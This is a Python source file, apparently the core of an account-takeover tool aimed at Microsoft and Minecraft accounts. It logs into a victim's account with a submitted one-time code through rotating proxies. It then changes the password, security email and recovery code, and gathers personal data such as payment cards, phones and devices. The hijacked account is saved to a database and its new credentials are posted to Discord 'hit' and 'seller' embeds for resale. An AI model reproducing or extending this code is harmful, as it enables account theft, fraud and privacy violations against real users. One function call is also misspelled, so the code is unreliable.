from authsecuring.utils.cookies.get_livedata import livedata
from authsecuring.embed_builder import (
    add_cred_line_field,
    assemble_account_embeds,
    make_failure_embed,
    public_decline_reason,
)
from authsecuring.auth.polish_host import polish_session
from authsecuring.auth.get_msaauth import acquire_msaauth
from authsecuring.auth.initial_session import open_session, clone_with_fresh_proxy
from authsecuring.utils.secure import lock_account
from authsecuring.filters import rejection_cause
from authsecuring.banwatch import run_ban_sweep

from authsecuring.utils.proxy import retry_with_proxy, proxy_error_reason
from storage.romeo_db import RomeoDB as DBConnection
from discord import Embed
import asyncio
import httpx
import uuid
import time
import logging

rom = logging.getLogger("romeo.orch")


async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) -> dict:
    ms = (record.get("microsoft") or {}).copy()
    mc = (record.get("minecraft") or {}).copy()
    sec = str(ms.get("security_email") or "").strip()
    pwd = str(ms.get("password") or "").strip()
    rec = str(ms.get("recovery_code") or "").strip()
    origin = str(ms.get("original_email") or email or "").strip() or email
    primary = str(ms.get("email") or "").strip() or origin
    swapped = ms.get("primary_alias_replaced")
    if swapped is None and primary.lower() != origin.lower():
        swapped = True

    sentinel = {"Couldn't Change!", "Unknown", "N/A", "?"}
    moved = bool(swapped is True) or any(
        v and v not in sentinel and "Couldn't Change" not in v
        for v in [sec, pwd, rec]
    )
    if moved:
        creds_changed = True

    detail = str(ms.get("recover_error") or why or "").strip() or why

    summary = {
        "email": primary,
        "original_email": origin,
        "security_email": sec or "Couldn't Change!",
        "password": pwd or "Couldn't Change!",
        "recovery_code": rec or "Couldn't Change!",
        "username": mc.get("name"),
        "primary_alias_replaced": swapped,
    }
    ms.update(summary)

    fail = make_failure_embed(
        origin,
        ms,
        why,
        error=detail,
        credentials_changed=creds_changed,
    )

    return {
        "failed": True,
        "reason": public_decline_reason(why),
        "error": public_decline_reason(detail),
        "microsoft": ms,
        "minecraft": mc,
        "credentials_changed": creds_changed,
        "hit_embed": fail,
        "seller_embed": fail,
    }


start_time = time.monotonic()


async def romeo_secure(session: httpx.AsyncClient, email, device=None,
                               code=None, recovery=True, ppft=None, rextra=None,
                               command=False, embed_verify: bool = False):
    rom.info("door call — %s", email)
    account = {
        "microsoft": {
            "email": email or "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {"active": [], "canceled": [], "commercial": []},
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False,
        }
    }

    async def _login_pass(client: httpx.AsyncClient):
        rom.debug("canary — resolving ms login")
        live = await livedata(client)
        rom.debug("submitting ms login (otp / auth)")
        return await acquire_msauth(client, email, device, live, code, ppft)

    try:
        msaauth, session = await retry_with_proxy(
            session,
            _login_pass,
            new_session=open_session,
            tries=4,
            rotate_after=1,
            tag="livedata-login",
            email=email,
        )
    except Exception as exc:
        rom.error("login pipeline failed %s: %s", email, exc)
        reason = proxy_error_reason(exc)
        if reason == "network":
            reason = f"Proxy/network flaked during ms login ({exc}). OTP may still work — retry submit."
        return await _reject(email, reason, account, creds_changed=False)

    if isinstance(msaauth, dict) and msaauth.get("_error"):
        return await _reject(email, str(msaauth["_error"]), account, creds_changed=False)

    if not msaauth:
        return await _reject(email,
            "Login failed — no msauth session. OTP wrong or expired.",
            account, creds_changed=False)

    if rextra:
        account["microsoft"]["password"] = rextra.get("password")
        account["microsoft"]["security_email"] = rextra.get("security_email")
        account["microsoft"]["recovery_code"] = rextra.get("recovery_code")

    if embed_verify and msaauth == "Family":
        rom.warning("embed verify — family interrupt, going cookies-only")
        msaauth = {"_cookies_only": True}

    match msaauth:
        case "Recovery":
            rom.warning("account recovery required — %s", email)
            return await _reject(email, "Account needs MS account recovery.",
                          account, creds_changed=False)

        case "Family":
            rom.warning("family locked — %s", email)
            return await _reject(email, "Account is Family Locked.",
                          account, creds_changed=False)

        case _:
            rom.debug("msauth acquired — polishing")
            try:
                await polish_session(session, msaauth)
            except Exception:
                rom.exception("polish_session threw — carrying on")
                print("[!] — polish_session threw; carrying cookies")

            rom.debug("polish done")
            tries = 5
            last = None
            for attempt in range(1, tries + 1):
                try:
                    account = await lock_account(
                        session=session,
                        recovery=recovery,
                        record=account,
                        command=command,
                        embed_verify=embed_verify,
                    )
                    last = None
                    break
                except Exception as exc:
                    last = exc
                    if proxy_error_reason(exc) == "network" and attempt < tries:
                        rom.warning("lock_account %s for %s (%d/%d) — new proxy",
                                     exc.__class__.__name__, email, attempt, tries)
                        print(f"[!] — lock threw ({exc.__class__.__name__}) ({attempt}/{tries}) — rotating proxy…")
                        try:
                            nxt = clone_with_fresh_proxy(session)
                        except Exception:
                            rom.exception("clone failed")
                            nxt = None
                        if nxt:
                            session = nxt
                        await asyncio.sleep(1.5 * attempt)
                        continue
                    break

            if last is not None:
                rom.error("lock_account crashed after login %s: %s", email, last)
                detail = proxy_error_reason(last) or str(last)
                print(f"[x] — lock_account crashed: {detail}")

                amc_hit = "get_amc" in str(last).lower() or "account.microsoft.com" in str(last).lower()
                if amc_hit and not (bool(rextra) or (account.get("microsoft") or {}).get("primary_alias_replaced") is True):
                    msg = f"ms portal unreachable ({detail}). Login worked; pw/email unchanged. Retry submit."
                elif proxy_error_reason(last) == "network":
                    msg = f"Locking step network timeout: {detail}. Login done; creds above may already differ. Retry lock."
                else:
                    msg = f"Locking failed: {detail}"

                return await _reject(email, msg, account, creds_changed=bool(rextra))

    elapsed = round(time.time() - start_time, 2)
    creds_changed = bool(rextra) or (
        str((account.get("microsoft") or {}).get("password") or "")
        not in ("", "Couldn't Change!", "Unknown")
        and "UNVERIFIED" not in str((account.get("microsoft") or {}).get("password") or "")
    )

    if (account.get("microsoft") or {}).get("primary_alias_replaced") is True:
        creds_changed = True

    reject = rejection_cause(account)
    if embed_verify:
        if reject:
            rom.debug("embed verify — skipping autobuy reject (%s)", reject)
        ban_hit = await run_ban_sweep(account)
        if ban_hit:
            rom.debug("embed verify — skipping ban (%s)", ban_hit)
    else:
        if reject:
            rom.warning("rejected %s: %s", email, reject)
            return await _reject(email, reject, account, creds_changed=creds_changed)

        ban = await run_ban_sweep(account)
        if ban:
            rom.warning("banned %s: %s", email, ban)
            return await _reject(email, ban, account, creds_changed=creds_changed)

    aid = uuid.uuid4().hex
    with DBConnection() as db:
        db.store_locked(aid, account)

    try:
        return await assemble_account_embeds(account, elapsed, aid)
    except Exception as exc:
        rom.exception("assemble failed after lock")
        ms = account["microsoft"]
        fb = Embed(
            title=f"Secured in ~{elapsed}s (embed partial)",
            description=f"Account locked but detail embed failed: `{exc.__class__.__name__}: {exc}`",
            color=0x279CF5,
        )
        fb.add_field(name="Primary", value=f"```{ms.get('email', 'Unknown')}```", inline=False)
        fb.add_field(name="Security Email", value=f"```{ms.get('security_email', 'Unknown')}```", inline=True)
        fb.add_field(name="Password", value=f"```{ms.get('password', 'Unknown')}```", inline=True)
        fb.add_field(name="Recovery", value=f"```{ms.get('recovery_code', 'Unknown')}```", inline=False)
        fb.add_field(name="MC Username", value=f"```{account['minecraft'].get('name', 'Unknown')}```", inline=False)
        add_cred_line_field(
            fb,
            email=ms.get("email", ""),
            recovery=ms.get("recovery_code", ""),
            password=ms.get("password", ""),
            security_email=ms.get("security_email", ""),
            username=account["minecraft"].get("name", ""),
        )
        return {
            "hit_embed": fb,
            "account_id": aid,
            "minecraft": account["minecraft"],
            "details": {
                "stats_embed": fb,
                "ssid_embed": fb,
                "info_embed": fb,
                "xbox_embed": fb,
                "family_embed": fb,
                "devices_embed": fb,
                "cards_embed": fb,
                "subs_embed": fb,
                "phones_embed": fb,
                "account_details": (
                    f"**Username:** {account['minecraft'].get('name', 'Unknown')}\n"
                    f"**Email:** {ms.get('email', 'Unknown')}\n"
                    f"**Security Email:** {ms.get('security_email', 'Unknown')}\n"
                    f"**Password:** {ms.get('password', 'Unknown')}\n"
                    f"**Recovery:** {ms.get('recovery_code', 'Unknown')}"
                ),
            },
        }
